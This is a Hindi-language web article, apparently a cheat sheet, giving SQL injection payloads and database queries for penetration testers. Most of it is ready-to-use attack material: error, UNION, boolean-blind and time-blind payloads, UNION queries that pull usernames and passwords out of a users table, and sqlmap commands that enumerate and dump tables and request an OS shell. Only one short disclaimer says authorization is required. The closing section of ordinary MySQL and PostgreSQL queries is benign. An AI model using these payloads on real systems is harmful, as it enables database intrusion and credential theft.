---
title: "SQL इंजेक्शन और डेटाबेस क्वेरी: पेनटेस्टर संदर्भ गाइड"
description: "SQL इंजेक्शन पेलोड, UNION अटैक, ब्लाइंड SQLi तकनीकें, और MySQL तथा PostgreSQL के लिए मानक डेटाबेस क्वेरी। पेनेट्रेशन टेस्टर और डेटाबेस एडमिनिस्ट्रेटर के लिए सामरिक संदर्भ।"
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["SQL इंजेक्शन पेलोड", "MySQL कमांड चीटशीट", "PostgreSQL चीट शीट", "डेटाबेस हैकिंग", "sqlmap कमांड", "UNION SQL इंजेक्शन", "ब्लाइंड SQL इंजेक्शन", "SQL इंजेक्शन टेस्टिंग", "डेटाबेस एन्यूमरेशन", "SQL इंजेक्शन रोकथाम"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL इंजेक्शन और डेटाबेस क्वेरी: पेनटेस्टर संदर्भ गाइड",
    "description": "SQL इंजेक्शन पेलोड, UNION अटैक, ब्लाइंड SQLi, और MySQL तथा PostgreSQL के लिए डेटाबेस क्वेरी।",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "hi"
  }
---

## सिस्टम इनिशियलाइज़ेशन

SQL इंजेक्शन वेब एप्लिकेशन की सबसे गंभीर कमज़ोरियों में से एक बनी हुई है — लगातार OWASP Top 10 में शामिल। यह तब होता है जब उपयोगकर्ता इनपुट को उचित सैनिटाइज़ेशन के बिना सीधे SQL क्वेरी में जोड़ दिया जाता है, जिससे हमलावर डेटाबेस क्वेरी लॉजिक में हेरफेर कर सकता है। एक सफल SQL इंजेक्शन पूर्ण डेटा चोरी, प्रमाणीकरण बाईपास, विशेषाधिकार वृद्धि और कुछ मामलों में डेटाबेस सर्वर पर रिमोट कमांड निष्पादन तक ले जा सकता है। यह फील्ड मैनुअल अधिकृत पेनेट्रेशन टेस्टिंग के लिए आक्रामक पेलोड और हर डेटाबेस एडमिनिस्ट्रेटर को ज्ञात मानक SQL क्वेरी दोनों प्रदान करता है।

सभी इंजेक्शन तकनीकें केवल अधिकृत परीक्षण के लिए हैं। अनधिकृत पहुँच अवैध है।

---

## SQLi डिटेक्शन

SQL इंजेक्शन भेद्यता का शोषण करने से पहले, आपको इसके अस्तित्व की पुष्टि करनी होगी। डिटेक्शन में एप्लिकेशन पैरामीटर्स को विशेष रूप से तैयार किए गए इनपुट भेजना और त्रुटि संदेशों, व्यवहार परिवर्तनों, या समय अंतर के लिए प्रतिक्रिया का निरीक्षण करना शामिल है। ये प्रारंभिक जाँच आपको बताती हैं कि पैरामीटर इंजेक्टेबल है या नहीं और किस प्रकार का इंजेक्शन संभव है।

### बुनियादी डिटेक्शन पेलोड

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### डेटाबेस बैकएंड की पहचान

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION अटैक

UNION-आधारित SQL इंजेक्शन सबसे शक्तिशाली तकनीक है जब त्रुटि संदेश या क्वेरी परिणाम पेज पर प्रदर्शित होते हैं। यह मूल क्वेरी में `UNION SELECT` स्टेटमेंट जोड़कर काम करता है, जिससे आप डेटाबेस में किसी भी टेबल से डेटा निकाल सकते हैं। मुख्य आवश्यकता मूल क्वेरी में सही कॉलम संख्या निर्धारित करना है ताकि UNION स्टेटमेंट मेल खाए।

### कॉलम संख्या निर्धारित करें

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### डेटा निकालें

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## ब्लाइंड SQL इंजेक्शन

जब एप्लिकेशन पेज पर क्वेरी परिणाम या त्रुटि संदेश प्रदर्शित नहीं करता, तो आप ब्लाइंड SQL इंजेक्शन से निपट रहे हैं। भेद्यता अभी भी मौजूद है, लेकिन डेटा निष्कर्षण के लिए अनुमान की आवश्यकता होती है — या तो बूलियन शर्तों (क्या पेज बदलता है?) या समय विलंब (क्या प्रतिक्रिया में अधिक समय लगता है?) के माध्यम से। ब्लाइंड SQLi धीमा है लेकिन उतना ही खतरनाक है।

### बूलियन-आधारित ब्लाइंड

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### समय-आधारित ब्लाइंड

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## SQLMap ऑटोमेशन

SQLMap SQL इंजेक्शन के स्वचालित पहचान और शोषण के लिए उद्योग-मानक उपकरण है। यह पहचान, फिंगरप्रिंटिंग, डेटा निष्कर्षण और यहाँ तक कि SQL इंजेक्शन के माध्यम से OS-स्तरीय पहुँच को संभालता है — सब कमांड लाइन से। अधिकृत पेनेट्रेशन टेस्ट के लिए, यह शोषण चरण को काफी तेज़ करता है।

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## मानक SQL क्वेरी

इंजेक्शन परीक्षण के अलावा, हर सुरक्षा पेशेवर और डेवलपर को डेटाबेस प्रशासन, लॉग विश्लेषण और जाँच के दौरान डेटा निष्कर्षण के लिए मानक SQL जानना आवश्यक है। ये क्वेरी MySQL और PostgreSQL दोनों पर काम करती हैं और सबसे सामान्य डेटाबेस ऑपरेशन को कवर करती हैं।

### SELECT क्वेरी

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOIN क्वेरी

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### डेटाबेस प्रशासन

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
